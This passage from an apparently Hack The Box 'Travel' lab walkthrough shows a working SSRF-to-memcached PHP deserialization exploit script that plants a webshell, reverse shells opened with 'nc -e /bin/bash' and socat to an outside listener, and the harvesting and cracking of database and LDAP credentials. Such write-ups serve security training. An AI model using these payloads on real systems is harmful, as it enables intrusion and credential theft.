Write</strong></p><p>Since it’s going to be a pain let’s write a script to pull the exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://blog.travel.htb/&quot;</span></span><br><span class="line">shell = <span class="string">&quot;hg8.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span>():</span></span><br><span class="line">    len_shell = <span class="built_in">str</span>(<span class="built_in">len</span>(shell))</span><br><span class="line">    php_obj = <span class="string">&#x27;O:14:&quot;TemplateHelper&quot;:2:&#123;s:4:&quot;file&quot;;s:&#x27;</span>+len_shell+<span class="string">&#x27;:&quot;&#x27;</span>+shell+<span class="string">&#x27;&quot;;s:4:&quot;data&quot;;s:31:&quot;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&quot;;&#125;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    len_php_obj = <span class="built_in">len</span>(php_obj)</span><br><span class="line">    memcached_cmd = <span class="string">f&quot;\r\nset xct_4e5612ba079c530a6b1f148c0b352241 0 0 <span class="subst">&#123;len_php_obj&#125;</span>\r\n<span class="subst">&#123;php_obj&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Memcached command to run: <span class="subst">&#123;memcached_cmd&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    encoded_payload = urllib.parse.quote(memcached_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;gopher://127.1:11211/<span class="subst">&#123;encoded_payload&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_payload</span>(<span class="params">payload</span>):</span></span><br><span class="line">    ssrf_payload = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>awesome-rss/?debug&amp;custom_feed_url=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]Final SSRF Payload: <span class="subst">&#123;ssrf_payload&#125;</span>\n&quot;</span>)</span><br><span class="line">    r = requests.get(ssrf_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deserialize</span>():</span></span><br><span class="line">    requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>awesome-rss/&quot;</span>)</span><br><span class="line">    webshell_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>wp-content/themes/twentytwenty/logs/<span class="subst">&#123;shell&#125;</span>&quot;</span></span><br><span class="line">    webshell = requests.get(webshell_url)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Checking for <span class="subst">&#123;shell&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> webshell.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] File found! Injection successful.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = generate_payload()</span><br><span class="line">    inject_payload(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        deserialize()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>Let’s run it to see if everything goes fine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit-test.py</span><br><span class="line">[+] Memcached <span class="built_in">command</span> to run:</span><br><span class="line"><span class="built_in">set</span> xct_4e5612ba079c530a6b1f148c0b352241 0 0 101</span><br><span class="line">O:14:<span class="string">&quot;TemplateHelper&quot;</span>:2:&#123;s:4:<span class="string">&quot;file&quot;</span>;s:7:<span class="string">&quot;hg8.php&quot;</span>;s:4:<span class="string">&quot;data&quot;</span>;s:31:<span class="string">&quot;&lt;?php system(<span class="variable">$_REQUEST</span>[&quot;</span>cmd<span class="string">&quot;]);&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">[+] Final SSRF Payload: </span><br><span class="line">http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url=gopher://127.1:11211/%0D%0Aset%20xct_4e5612ba079c530a6b1f148c0b352241%200%200%20101%0D%0AO%3A14%3A%22TemplateHelper%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A7%3A%22hg8.php%22%3Bs%3A4%3A%22data%22%3Bs%3A31%3A%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%22%3B%7D%0D%0A</span><br><span class="line"></span><br><span class="line">[+] Checking <span class="keyword">for</span> hg8.php</span><br><span class="line">[*] File found! Injection successful.</span><br></pre></td></tr></table></figure><p>Bingo it worked! </p><h3 id="Upgrade-Web-Shell-with-Socat"><a href="#Upgrade-Web-Shell-with-Socat" class="headerlink" title="Upgrade Web-Shell with Socat"></a>Upgrade Web-Shell with Socat</h3><p>Alright now we have our web-shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/wp-content/themes/twentytwenty/logs/hg8.php?cmd=id&quot;</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>Let’s open a reverse shell to upgrade to a more stable shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/wp-content/themes/twentytwenty/logs/hg8.php?cmd=nc%20-e%20/bin/bash%2010.10.10.10%208585&quot;</span> </span><br></pre></td></tr></table></figure><p>And we get a new connection to open on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.189:47778</span><br></pre></td></tr></table></figure><p>Unfortunately there is no <code>python</code> nor <code>python3</code> installed on the box allowing us to upgrade our shell. Thankfully after a bit of search we found out <code>socat</code> is installed. Let’s upgrade our shell using it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.189:47778</span><br><span class="line">$ <span class="built_in">which</span> python</span><br><span class="line"><span class="built_in">which</span> python3</span><br><span class="line">$ <span class="built_in">which</span> socat</span><br><span class="line">/usr/bin/socat</span><br><span class="line">$ socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</span><br></pre></td></tr></table></figure><p>Now we have a proper shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 4444</span><br><span class="line">Listening on any address 4444 (krb524)</span><br><span class="line">Connection from 10.10.10.189:33944</span><br><span class="line">www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$</span><br><span class="line">www-data@blog:/$</span><br></pre></td></tr></table></figure><p>What a ride! Let’s see what’s next.</p><h3 id="Pivot-www-data-gt-lynik-admin"><a href="#Pivot-www-data-gt-lynik-admin" class="headerlink" title="Pivot www-data -&gt; lynik-admin"></a>Pivot www-data -&gt; lynik-admin</h3><p>The <code>hostname</code> and different informations makes us understand we are in a Docker container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/$ ls -la /</span><br><span class="line">total 88</span><br><span class="line">drwxr-xr-x   1 root root 4096 Apr 23 18:44 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Apr 23 18:44 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Apr 23 18:44 .dockerenv</span><br><span class="line">www-data@blog:/home$ cat /proc/1/cgroup</span><br><span class="line">12:devices:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">11:memory:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">10:freezer:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">9:perf_event:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">7:net_cls,net_prio:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">6:hugetlb:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">5:blkio:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">4:cpu,cpuacct:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">3:pids:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">2:cpuset:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">1:name=systemd:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br></pre></td></tr></table></figure><p>Well let’s keep that in mind and continue our recon.</p><p>Since we know the travel website is a Wordpress site we can retrieve database credentials inside <code>wp-config.php</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/var/www/html$ cat wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wp&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wp&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;fiFtDDV9LYe8Ti&#x27;</span> );</span><br></pre></td></tr></table></figure><p>Let’s see if we can retrieve interesting accounts from the database:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/var/www/html$ mysql -u wp -p</span><br><span class="line">mysql -u wp -p</span><br><span class="line">Enter password: fiFtDDV9LYe8Ti</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wp                 |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; USE wp</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">MariaDB [wp]&gt; SHOW TABLES;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wp          |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wp]&gt; SELECT * FROM wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | admin      | $P<span class="variable">$BIRXVj</span>/ZG0YRiBH8gnRy0chBx67WuK/ | admin         | admin@travel.htb | http://localhost | 2020-04-13 13:19:01 |                     |           0 | admin        |</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br></pre></td></tr></table></figure><p>We have a hash from <code>admin</code> account. Unfortunately <code>John</code> can not seem to crack it. Let’s move on.</p><p>While looking around we quickly stumble upon a database backup file in <code>/opt/wordpress/</code> containing another user account belonging to <code>lynik-admin</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/opt/wordpress$ grep -ri <span class="string">&quot;wp_users&quot;</span> backup-13-04-2020.sql</span><br><span class="line">grep <span class="string">&quot;wp_users&quot;</span> backup-13-04-2020.sql</span><br><span class="line">[...]</span><br><span class="line">CREATE TABLE `wp_users` (</span><br><span class="line">-- Dumping data <span class="keyword">for</span> table `wp_users`</span><br><span class="line">LOCK TABLES `wp_users` WRITE;</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `wp_users` VALUES (1,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin@travel.htb&#x27;</span>,<span class="string">&#x27;http://localhost&#x27;</span>,<span class="string">&#x27;2020-04-13 13:19:01&#x27;</span>,<span class="string">&#x27;&#x27;</span>,0,<span class="string">&#x27;admin&#x27;</span>),(2,<span class="string">&#x27;lynik-admin&#x27;</span>,<span class="string">&#x27;$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.&#x27;</span>,<span class="string">&#x27;lynik-admin&#x27;</span>,<span class="string">&#x27;lynik@travel.htb&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;2020-04-13 13:36:18&#x27;</span>,<span class="string">&#x27;&#x27;</span>,0,<span class="string">&#x27;Lynik Schmidt&#x27;</span>);</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;</span><br><span class="line">www-data@blog:/opt/wordpress$</span><br></pre></td></tr></table></figure><p>Let’s see if we can crack its password hash:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hugo@archpen ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt lynik-hash           </span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">1stepcloser      (?)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Bingo! Let’s see if we can connect through SSH using this credential:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hugo@archpen ~]$ ssh lynik-admin@travel.htb</span><br><span class="line">lynik-admin@travel.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Fri 29 May 2020 01:39:02 PM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:                      0.1</span></span><br><span class="line"><span class="string">  Usage of /:                       46.1% of 15.68GB</span></span><br><span class="line"><span class="string">  Memory usage:                     18%</span></span><br><span class="line"><span class="string">  Swap usage:                       0%</span></span><br><span class="line"><span class="string">  Processes:                        200</span></span><br><span class="line"><span class="string">  Users logged in:                  0</span></span><br><span class="line"><span class="string">  IPv4 address for br-836575a2ebbb: 172.20.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for docker0:         172.17.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for eth0:            10.10.10.189</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lynik-admin@travel:~$ cat user.txt</span></span><br><span class="line"><span class="string">7xxxxxxxxxxxxxxxxxxxxxxxa</span></span><br></pre></td></tr></table></figure><h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>First thing that come to mind is to check for more informations about docker. We know that docker is running and hosting the Travel Blog:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:b9:c0:9b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.10.10.189/24 brd 10.10.10.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: br-836575a2ebbb: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:48:28:52:95 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.20.0.1/24 brd 172.20.0.255 scope global br-836575a2ebbb</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: br-8ec6dcae5ba1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:6d:76:46:c1 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.30.0.1/24 brd 172.30.0.255 scope global br-8ec6dcae5ba1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">5: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="line">    link/ether 02:42:28:4b:e0:70 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>Unfortunately <code>lynik-admin</code> does not belong to <code>docker</code> group so we can not escalate privileges this way (it would have been too easy right?).</p><h3 id="LDAP-Server"><a href="#LDAP-Server" class="headerlink" title="LDAP Server"></a>LDAP Server</h3><p>While looking around we notice a few informations about a LDAP server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ cat /etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 travel</span><br><span class="line">172.20.0.10 ldap.travel.htb</span><br><span class="line">lynik-admin@travel:~$ cat .ldaprc</span><br><span class="line">HOST ldap.travel.htb</span><br><span class="line">BASE dc=travel,dc=htb</span><br><span class="line">BINDDN cn=lynik-admin,dc=travel,dc=htb</span><br></pre></td></tr></table></figure><p>Let’s digg a bit more to see what additional informations we can find about this LDAP server.</p><h3 id="LDAP-Admin-Password"><a href="#LDAP-Admin-Password" class="headerlink" title="LDAP Admin Password"></a>LDAP Admin Password</h3><p>While searching for file related to ldap we strangely find a few occurence of the <code>ldap</code> string in <code>.viminfo</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ grep -ri ldap</span><br><span class="line">.viminfo:<span class="string">&#x27;0  3  0  ~/.ldaprc</span></span><br><span class="line"><span class="string">.viminfo:|4,48,3,0,1587670530,&quot;~/.ldaprc&quot;</span></span><br><span class="line"><span class="string">.viminfo:-&#x27;</span>  3  0  ~/.ldaprc</span><br><span class="line">.viminfo:|4,39,3,0,1587670530,<span class="string">&quot;~/.ldaprc&quot;</span></span><br><span class="line">.viminfo:-<span class="string">&#x27;  1  0  ~/.ldaprc</span></span><br><span class="line"><span class="string">.viminfo:|4,39,1,0,1587670527,&quot;~/.ldaprc&quot;</span></span><br><span class="line"><span class="string">.viminfo:&gt; ~/.ldaprc</span></span><br><span class="line"><span class="string">.ldaprc:HOST ldap.travel.htb</span></span><br></pre></td></tr></table></figure><p>According to <a href="https://vimhelp.org/starting.txt.html#viminfo">vim man page</a>, <code>.viminfo</code> is used as “session” file:</p><blockquote><p>If you exit Vim and later start it again, you would normally lose a lot of<br>information.  The viminfo file can be used to remember that information, which<br>enables you to continue where you left off.</p><p>The viminfo file is used to store:</p><ul><li>The command line history.</li><li>The search string history.</li><li>The input-line history.</li><li>Contents of non-empty registers.</li><li>Marks for several files.</li><li>File marks, pointing to locations in files.</li><li>Last search/substitute pattern (for ‘n’ and ‘&amp;’).</li><li>The buffer list.</li><li>Global variables.</li></ul></blockquote><p>Let’s see what informations we can find in this file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ cat .viminfo</span><br><span class="line"><span class="comment"># This viminfo file was generated by Vim 8.1.</span></span><br><span class="line"><span class="comment"># You may edit it if you&#x27;re careful!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Command Line History (newest to oldest):</span></span><br><span class="line">:wq!</span><br><span class="line">|2,0,1587670530,,<span class="string">&quot;wq!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Registers:</span></span><br><span class="line"><span class="string">&quot;&quot;</span>1     LINE    0</span><br><span class="line">        BINDPW Theroadlesstraveled</span><br><span class="line">|3,1,1,1,1,0,1587670528,<span class="string">&quot;BINDPW Theroadlesstraveled&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># File marks:</span></span><br><span class="line"><span class="string">&#x27;0  3  0  ~/.ldaprc</span></span><br><span class="line"><span class="string">|4,48,3,0,1587670530,&quot;~/.ldaprc&quot;</span></span><br></pre></td></tr></table></figure><p>We have an interesting line containing <code>BINDPW Theroadlesstraveled</code>. According to LDAP documentation <code>BINDPW</code> seems to be the administrative password of this LDAP Server.</p><p>Let’s confirm the password is valid:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ man ldapsearch</span><br><span class="line">-x            Use simple authentication instead of SASL.</span><br><span class="line">-w passwd     Use passwd as the password <span class="keyword">for</span> simple authentication.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ ldapsearch -x -w hg8</span><br><span class="line">ldap_bind: Invalid credentials (49)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 